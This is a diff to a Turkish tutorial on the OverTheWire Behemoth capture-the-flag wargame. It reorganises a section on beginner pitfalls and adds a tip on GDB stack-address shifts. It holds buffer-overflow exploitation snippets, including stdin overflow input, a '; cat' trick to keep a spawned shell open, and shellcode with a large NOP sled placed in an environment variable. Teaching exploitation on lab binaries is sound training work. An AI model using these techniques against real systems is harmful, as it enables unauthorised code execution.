@@ -241,7 +241,9 @@ Behemoth kasıtlı olarak bu korumaları devre dışı bırakmış — eğitim o
 
 ## 🚨 4. Yeni Başlayanların Düştüğü Tuzaklar
 
-**Narnia'dan farklı: `argv` değil `stdin`.** Behemoth1'de `./behemoth1 AAAA` yazmak buffer'ı taşırmaz çünkü binary `argv`'yi değil `stdin`'i okuyor. Doğru yöntem:
+### Tuzak 1 — Narnia'dan farklı: `argv` değil `stdin`
+
+Behemoth1'de `./behemoth1 AAAA` yazmak buffer'ı taşırmaz çünkü binary `argv`'yi değil `stdin`'i okuyor. Doğru yöntem:
 
 ```bash
 # Yanlış — argüman olarak verme
@@ -251,7 +253,9 @@ Behemoth kasıtlı olarak bu korumaları devre dışı bırakmış — eğitim o
 python3 -c "import sys; sys.stdout.buffer.write(b'A'*200)" | /behemoth/behemoth1
 ```
 
-**`; cat` unutmak.** Pipe'la shellcode gönderdiğinde, payload biter bitmez stdin kapanır ve shell de kapanır. `; cat` stdin'i açık tutar:
+### Tuzak 2 — `; cat` unutmak
+
+Pipe'la shellcode gönderdiğinde, payload biter bitmez stdin kapanır ve shell de kapanır. `; cat` stdin'i açık tutar:
 
 ```bash
 # Shell açılır ama hemen kapanır
@@ -261,7 +265,9 @@ python3 -c "..." | /behemoth/behemoth1
 (python3 -c "..."; cat) | /behemoth/behemoth1
 ```
 
-**EIP adresini yanlış hesaplamak.** Offset bulmak için cyclic pattern kullan:
+### Tuzak 3 — EIP adresini yanlış hesaplamak
+
+Offset bulmak için cyclic pattern kullan:
 
 ```bash
 # GDB ile pattern oluştur
@@ -274,7 +280,9 @@ gdb /behemoth/behemoth1
 # pattern search: found at offset 71
 ```
 
-**Dosya shellcode'unu yanlış yazmak.** Behemoth6'da shellcode dosyaya **binary** olarak yazılmalı, metin olarak değil:
+### Tuzak 4 — Dosya shellcode'unu yanlış yazmak
+
+Behemoth6'da shellcode dosyaya **binary** olarak yazılmalı, metin olarak değil:
 
 ```bash
 # Yanlış — string olarak
@@ -288,15 +296,58 @@ xxd /tmp/behemoth6/shellcode | head -2
 # 00000000: 31c0 5068 2f2f 7368 ...  ← ham byte görünmeli
 ```
 
-**Environment variable boyutunun stack konumunu etkilemesi.** `getenv()` ile bulduğun adres binary'yi farklı argümanlarla çalıştırdığında kayabilir. Binary'ye exploit'i verirken `getenv` adresini aynı şartlar altında bul:
+### Tuzak 5 — Environment variable boyutunun stack konumunu etkilemesi
+
+`getenv()` ile bulduğun adres binary'yi farklı argümanlarla çalıştırdığında kayabilir. Binary'ye exploit'i verirken `getenv` adresini aynı şartlar altında bul:
 
 ```bash
-# Adres bulmak için aynı binary'yi kullan, aynı argument sayısıyla
 gdb /behemoth/behemoth7
 (gdb) break main
 (gdb) run AAAA
 (gdb) x/s *(char**)environ   # environment başlangıcı
 ```
+
+---
+
+## 💡 Pro-Tip: GDB ile Dış Dünya Arasındaki Adres Kayması (Stack Shift)
+
+Environment variable kullanarak shellcode enjekte ederken karşılaşılan en yaygın tuzak: **"GDB içinde kusursuz çalışan exploit, GDB dışında neden SegFault veriyor?"**
+
+**Neden olur?** Linux'ta program başladığında stack'in en tepesine iki şey yerleştirilir: `argv[0]` (programın adı) ve tüm environment variable'lar. GDB içinde binary'yi `/behemoth/behemoth7` tam yoluyla çalıştırırken, dışarıda `./behemoth7` ile çalıştırırsın. Sadece bu isim farkı bile stack'teki tüm adreslerin birkaç byte kaymasına neden olur.
+
+Üstelik GDB, kendi içinde `LINES` ve `COLUMNS` gibi ekstra environment variable'lar ekler. Bu yüzden GDB içindeki bellek haritası ile dış dünyadaki hiçbir zaman birebir aynı değildir.
+
+#### Yöntem A — Devasa NOP Sled (Kaba Kuvvet)
+
+Adres kayması 50-100 byte arasında olur. NOP sled'i çok büyük tutarsan, hedef adres kaysa bile sled içine düşer:
+
+```bash
+# 200 byte yerine 1000 byte NOP — sapma payı büyür
+export SC=$(python3 -c "
+import sys
+sys.stdout.buffer.write(b'\x90'*1000 + shellcode)
+")
+```
+
+#### Yöntem B — GDB'yi Çevre Değişkenlerinden Arındırmak (Hassas Atış)
+
+Adres kaynağını ortadan kaldırmak için GDB içinde dışarıyla aynı koşulları kur:
+
+```bash
+(gdb) unset env LINES      # GDB'nin eklediği ekstra değişkenleri sil
+(gdb) unset env COLUMNS
+(gdb) show env             # kalan değişkenleri kontrol et
+```
+
+Ayrıca binary'yi tam yol yerine kısa ismiyle çalıştır — `argv[0]` uzunluğu dışarıyla eşit olsun:
+
+```bash
+cd /behemoth
+gdb behemoth7       # /behemoth/behemoth7 değil, ./behemoth7 da değil
+(gdb) run AAAA...
+```
+
+Bu iki yöntemden birini uygulamak, "nerede hata yaptım?" diye saatlerce uğraşmaktan kurtarır.
 
 ---
 
